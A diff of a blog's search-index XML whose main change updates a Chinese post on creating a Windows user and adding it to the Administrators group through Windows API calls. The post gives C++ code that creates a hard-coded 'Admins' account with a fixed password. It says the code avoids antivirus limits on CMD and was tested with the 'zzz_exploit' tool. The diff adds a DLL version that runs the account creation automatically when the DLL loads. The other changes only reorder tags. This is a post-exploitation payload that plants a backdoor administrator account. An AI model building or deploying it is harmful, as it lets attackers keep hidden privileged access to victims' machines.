@@ -15,7 +15,7 @@
   <entry>
     <title><![CDATA[【C++】创建用户，并添加至管理组]]></title>
     <url>%2F2018%2F11%2F%E3%80%90C-%E3%80%91%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7%EF%BC%8C%E5%B9%B6%E6%B7%BB%E5%8A%A0%E8%87%B3%E7%AE%A1%E7%90%86%E7%BB%84%2F</url>
-    <content type="text"><![CDATA[摘要: 因有些需求，需要本地/远程添加用户。所以直接选择Windows API函数进行编写，因为部分杀软限制了CMD。123456程序名称：添加系统用户.exe(也可创建dll)编译平台：VS2015 C# (.NET Framework v4.0)、Windows 7 Ultimate x64编写语言：C++ (C#存在版本限制)测试条件：以管理员运行测试工具：zzz_exploit测试平台：xp-x64、win2003-x86、win7-x64、win2008-x64、win10-x64(火绒) --&gt;均可成功添加 0x00 思路及原理一）编程思路使用NetUserAdd函数添加普通权限的用户并指定级别。123456NET_API_STATUS NET_API_FUNCTION NetUserAdd( LPCWSTR servername, // 指向常量字符串的指针，该字符串是要指定远程服务器的DNS或NetBIOS名称来执行该函数。如果此参数为NULL，则使用本地计算机 DWORD level, // 指定数据的信息级别。 LPBYTE buf, // 指向指定数据的缓冲区的指针。此数据的格式取决于level参数的值。 LPDWORD parm_err); 使用NetLocalGroupAddMembers函数将现有用户账号添加到现有本地组。1234567NET_API_STATUS NET_API_FUNCTION NetLocalGroupAddMembers( LPCWSTR servername, // 指向常量字符串的指针，该字符串是要指定远程服务器的DNS或NetBIOS名称来执行该函数。如果此参数为NULL，则使用本地计算机 LPCWSTR groupname, // 指向常量字符串的指针，该字符串指定将向其添加指定用户或全局组的本地组的名称。 DWORD level, // 指定数据的信息级别。 LPBYTE buf, // 指向包含新本地组成员数据的缓冲区的指针。此数据的格式取决于level参数的值。 DWORD totalentries // 指定buf参数指向的缓冲区中的条目数。); 二）编写思路 定义USER_INFO_1 结构体该结构包含用户的账户信息，包括账户名，密码数据，权限级别和路径到用户的主目录。 调用NetUserAdd添加普通权限账户 调用NetLocalGroupAddMembers添加到管理员组 0x01 代码123456789101112131415161718192021222324252627282930313233343536373839// UserInfoAdd.cpp : 定义控制台应用程序的入口点。//#include "stdafx.h"#ifndef UNICODE#define UNICODE#endif#pragma comment(lib,"netapi32")#include &lt;stdio.h&gt;#include &lt;windows.h&gt;#include &lt;lm.h&gt;int wmain(int argc, wchar_t *argv[])&#123; // 定义USER_INFO_1结构体 USER_INFO_1 UserInfo; DWORD dwLevel = 1; DWORD dwError = 0; UserInfo.usri1_name = L"Admins"; // 账户 UserInfo.usri1_password = L"P@ssword233"; // 密码 UserInfo.usri1_priv = USER_PRIV_USER; UserInfo.usri1_home_dir = NULL; UserInfo.usri1_comment = NULL; UserInfo.usri1_flags = UF_SCRIPT; UserInfo.usri1_script_path = NULL; //添加名为Admins的用户,密码为P@ssword233 NetUserAdd(NULL, dwLevel, (LPBYTE)&amp;UserInfo, &amp;dwError); // 添加用户到administrators组 LOCALGROUP_MEMBERS_INFO_3 account; account.lgrmi3_domainandname = UserInfo.usri1_name; NetLocalGroupAddMembers(NULL, L"Administrators", 3, (LPBYTE)&amp;account, 1); return 0;&#125; 在编译代码的时候，选择MT，所有的依赖文件都会编进去。 0x02 备注123456支持最低客户端: Windows 2000 Professional [仅desktop apps]支持最低服务器: Windows 2000 Server [仅desktop apps]目标平台: WindowsHeader: lmaccess.h (include Lm.h)Library: Netapi32.libDLL: Netapi32.dll]]></content>
+    <content type="text"><![CDATA[摘要: 因有些需求，需要本地/远程添加用户。所以直接选择Windows API函数进行编写，因为部分杀软限制了CMD。123456程序名称：添加系统用户.exe(也可创建dll)编译平台：VS2015 C# (.NET Framework v4.0)、Windows 7 Ultimate x64编写语言：C++ (C#存在版本限制)测试条件：以管理员运行测试工具：zzz_exploit or other测试平台：xp-x64、win2003-x86、win7-x64、win2008-x64、win10-x64(火绒) --&gt;均可成功添加 0x00 思路及原理一）编程思路使用NetUserAdd函数添加普通权限的用户并指定级别。123456NET_API_STATUS NET_API_FUNCTION NetUserAdd( LPCWSTR servername, // 指向常量字符串的指针，该字符串是要指定远程服务器的DNS或NetBIOS名称来执行该函数。如果此参数为NULL，则使用本地计算机 DWORD level, // 指定数据的信息级别。 LPBYTE buf, // 指向指定数据的缓冲区的指针。此数据的格式取决于level参数的值。 LPDWORD parm_err); 使用NetLocalGroupAddMembers函数将现有用户账号添加到现有本地组。1234567NET_API_STATUS NET_API_FUNCTION NetLocalGroupAddMembers( LPCWSTR servername, // 指向常量字符串的指针，该字符串是要指定远程服务器的DNS或NetBIOS名称来执行该函数。如果此参数为NULL，则使用本地计算机 LPCWSTR groupname, // 指向常量字符串的指针，该字符串指定将向其添加指定用户或全局组的本地组的名称。 DWORD level, // 指定数据的信息级别。 LPBYTE buf, // 指向包含新本地组成员数据的缓冲区的指针。此数据的格式取决于level参数的值。 DWORD totalentries // 指定buf参数指向的缓冲区中的条目数。); 二）编写思路 定义USER_INFO_1 结构体该结构包含用户的账户信息，包括账户名，密码数据，权限级别和路径到用户的主目录。 调用NetUserAdd添加普通权限账户 调用NetLocalGroupAddMembers添加到管理员组 0x01 代码一）exe生成123456789101112131415161718192021222324252627282930313233343536373839// UserInfoAdd.cpp : 定义控制台应用程序的入口点。//#include "stdafx.h"#ifndef UNICODE#define UNICODE#endif#pragma comment(lib,"netapi32")#include &lt;stdio.h&gt;#include &lt;windows.h&gt;#include &lt;lm.h&gt;int wmain(int argc, wchar_t *argv[])&#123; // 定义USER_INFO_1结构体 USER_INFO_1 UserInfo; DWORD dwLevel = 1; DWORD dwError = 0; UserInfo.usri1_name = L"Admins"; // 账户 UserInfo.usri1_password = L"P@ssword233"; // 密码 UserInfo.usri1_priv = USER_PRIV_USER; UserInfo.usri1_home_dir = NULL; UserInfo.usri1_comment = NULL; UserInfo.usri1_flags = UF_SCRIPT; UserInfo.usri1_script_path = NULL; //添加名为Admins的用户,密码为P@ssword233 NetUserAdd(NULL, dwLevel, (LPBYTE)&amp;UserInfo, &amp;dwError); // 添加用户到administrators组 LOCALGROUP_MEMBERS_INFO_3 account; account.lgrmi3_domainandname = UserInfo.usri1_name; NetLocalGroupAddMembers(NULL, L"Administrators", 3, (LPBYTE)&amp;account, 1); return 0;&#125; 二）dll生成1234567891011121314151617181920212223242526272829#ifndef UNICODE#define UNICODE#endif#pragma comment(lib,&quot;netapi32&quot;)#include &lt;stdio.h&gt;#include &lt;windows.h&gt;#include &lt;tchar.h&gt; #include &lt;iostream&gt;#include &lt;lm.h&gt;#include &lt;stdlib.h&gt;#include &lt;atlimage.h&gt;int NetUserAdd()&#123; ....&#125;BOOL WINAPI DllMain(HINSTANCE hinstDll, DWORD dwReason, LPVOID lpvRevered) &#123; switch (dwReason) &#123; case DLL_PROCESS_ATTACH: NetUserAdd(); break; case DLL_PROCESS_DETACH: break; &#125; return TRUE;&#125; 在编译代码的时候，选择MT，所有的依赖文件都会编进去。 0x02 备注123456支持最低客户端: Windows 2000 Professional [仅desktop apps]支持最低服务器: Windows 2000 Server [仅desktop apps]目标平台: WindowsHeader: lmaccess.h (include Lm.h)Library: Netapi32.libDLL: Netapi32.dll]]></content>
       <categories>
         <category>编程之道</category>
       </categories>
@@ -124,8 +124,8 @@
         <category>Web安全</category>
       </categories>
       <tags>
-        <tag>Web安全</tag>
         <tag>PHP</tag>
+        <tag>Web安全</tag>
       </tags>
   </entry>
   <entry>
@@ -229,8 +229,8 @@
         <category>内网渗透</category>
       </categories>
       <tags>
-        <tag>tools</tag>
         <tag>内网</tag>
+        <tag>tools</tag>
         <tag>系统安全</tag>
       </tags>
   </entry>
@@ -242,8 +242,8 @@
         <category>编程之道</category>
       </categories>
       <tags>
-        <tag>Web安全</tag>
         <tag>PHP</tag>
+        <tag>Web安全</tag>
       </tags>
   </entry>
   <entry>
@@ -277,8 +277,8 @@
         <category>内网渗透</category>
       </categories>
       <tags>
-        <tag>tools</tag>
         <tag>内网</tag>
+        <tag>tools</tag>
         <tag>系统安全</tag>
       </tags>
   </entry>
